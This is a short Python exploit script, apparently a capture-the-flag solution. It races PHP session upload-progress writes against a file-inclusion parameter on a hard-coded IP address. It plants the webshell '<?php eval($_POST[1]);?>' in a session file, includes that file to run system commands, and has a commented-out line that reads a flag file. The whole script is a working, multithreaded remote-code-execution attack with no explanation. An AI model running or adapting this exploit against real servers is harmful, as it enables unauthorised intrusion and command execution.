import os

import requests
import threading
import sys

session = requests.session()
sess = 'yu22x'
url = "http://1.14.71.254:28050/"
url1 = "%s" % url
url2 = '%s?file=/tmp/sess_%s' % (url, sess)
data1 = {'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'}
# data2 = {'1': 'echo 11123;system("cat /flag_is_here_not_are_but_you_find");'}
data2 = {'1': 'echo 11123;system("ls");'}
file = {'file': 'abc'}
cookies = {'PHPSESSID': sess}


def write():
    while True:
        # print('write', threading.current_thread().name)
        r = session.post(url1, data=data1, files=file, cookies=cookies)


def read():
    while True:
        # print('read', threading.current_thread().name)
        r = session.post(url2, data=data2)
        if '11123' in r.text:
            print(r.text)
            os.system('taskkill /f /im python.exe')


from concurrent.futures import ThreadPoolExecutor, Future, ProcessPoolExecutor

with ThreadPoolExecutor(max_workers=30) as executor:
    for i in range(15):
        executor.submit(read)
        executor.submit(write)
